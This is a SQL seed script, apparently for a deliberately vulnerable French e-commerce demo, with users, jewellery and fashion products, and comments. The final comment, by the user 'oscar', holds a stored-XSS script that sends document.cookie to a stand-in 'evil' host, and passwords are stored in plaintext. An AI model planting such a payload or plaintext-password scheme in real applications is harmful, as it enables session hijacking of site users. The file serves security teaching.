INSERT INTO UTILISATEUR (UTI_ID, UTI_LOGIN, UTI_PWD)  VALUES (1, 'alice', 'bdxio2015');

INSERT INTO UTILISATEUR (UTI_ID, UTI_LOGIN, UTI_PWD)  VALUES (2, 'oscar', 'hacker2015');

INSERT INTO PRODUIT (PRD_ID, PRD_TITRE, PRD_DESCRIPTION, PRD_PRIX, PRD_IMAGE, PRD_CATEGORIE, UTI_ID) 
VALUES (
100, 'Escarpins Louboutin', 
 'Chaussures très fashion à talon haut avec ses populaires semelles rouge et compensées. Chaussures entièrement recouvertes de cristal. Bijoux de perles Talon : 12 cm Disponible en ivoire', 
 595.99, 
 '/resources/img/produits/chaussure.jpg', 
 'chaussure',
 1);
 

 INSERT INTO PRODUIT (PRD_ID, PRD_TITRE, PRD_DESCRIPTION, PRD_PRIX, PRD_IMAGE, PRD_CATEGORIE, UTI_ID) 
VALUES (
101, 'Boucles d''Oreilles Swarovski',  'Idéales pour faire étinceler vos tenues quotidiennes !  Chaque clou en métal doré présente une boule Crystal Silver Shade serti en Pointiage, pour un éclat exceptionnel.',
 59.98, 
 '/resources/img/produits/boucles.jpg',
 'bijou',
 1);
 
 INSERT INTO PRODUIT (PRD_ID, PRD_TITRE, PRD_DESCRIPTION, PRD_PRIX, PRD_IMAGE, PRD_CATEGORIE, UTI_ID) 
VALUES (
102, 'Parfum pour femme Coco Chanel', 
 'Un parfum captivant et sensuel. Une invitation au voyage aux portes de l''Orient. Une goutte déposée derrière l''oreille, au creux du coude, au point de pulsation du poignet. Flacon de 50 ML Famille olfactive : Oriental & Epicé', 
 90.55, 
 '/resources/img/produits/parfum.jpg', 
 'cosmétique',
 1);
 
INSERT INTO PRODUIT (PRD_ID, PRD_TITRE, PRD_DESCRIPTION, PRD_PRIX,PRD_IMAGE, PRD_CATEGORIE, UTI_ID) 
VALUES (
103, 'Alliance Cleor', 
'Alliance Promesse Or 750/1000 Diamants 0,77 ct Couleur du métal Argenté Fabrication sur mesure', 
 2060.99, 
 '/resources/img/produits/alliance.jpg', 
 'bijou',
 2); 

 
INSERT INTO PRODUIT (PRD_ID, PRD_TITRE, PRD_DESCRIPTION, PRD_PRIX, PRD_IMAGE, PRD_CATEGORIE, UTI_ID) 
VALUES (
104, 'Pochette strass', 
'Sac de soirée strasse, idéal pour accompagner tenues lors de vos soirées, mariage ou vernissages. La chaîne amovible pour porter le sac sur l''épaule ou à la main. Fermeture à pression Dimension environ : largeur : 24 cm, profondeur : 6 cm, hauteur : 9 cm', 
 66.89, 
 '/resources/img/produits/sac.jpg',
 'vetement',
 2); 


INSERT INTO COMMENTAIRE (COM_ID, COM_CONTENU, PRD_ID, UTI_ID) 
VALUES (1, 'Quels sont les délais max de livraison du produit ?', 100, 1);

INSERT INTO COMMENTAIRE (COM_ID, COM_CONTENU, PRD_ID, UTI_ID) 
VALUES (2, 'Délicieux ces cookies !<script>new Image().src="http://securite-app-evil.herokuapp.com/steal?cookies="+document.cookie</script>', 101, 2);